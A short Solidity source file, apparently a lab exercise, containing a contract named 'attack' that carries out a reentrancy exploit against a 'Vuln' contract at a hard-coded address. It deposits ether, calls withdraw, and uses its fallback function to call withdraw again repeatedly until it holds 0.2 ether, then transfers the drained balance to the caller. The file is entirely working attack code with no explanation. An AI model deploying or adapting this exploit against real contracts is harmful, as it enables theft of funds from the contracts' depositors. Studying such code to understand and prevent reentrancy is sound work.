pragma solidity ^0.6.0;
import "./vuln.sol";

contract attack {

    Vuln vuln;

    constructor() public{
        vuln = Vuln(address(0xEB81D9a87BbbBf4066be04AdDaDbF03410F1F58d));
    }

    function addFunds() public payable{

        require(msg.value >= 0.1 ether,"Deposits must be no less than 0.1 Ether");

        vuln.deposit.value(msg.value)();
        vuln.withdraw();
    }

    function collectEther() public {
      msg.sender.transfer(address(this).balance);
    }

    fallback () payable external {
      if (address(this).balance < 0.2 ether) {
          vuln.withdraw();
      }
  }

}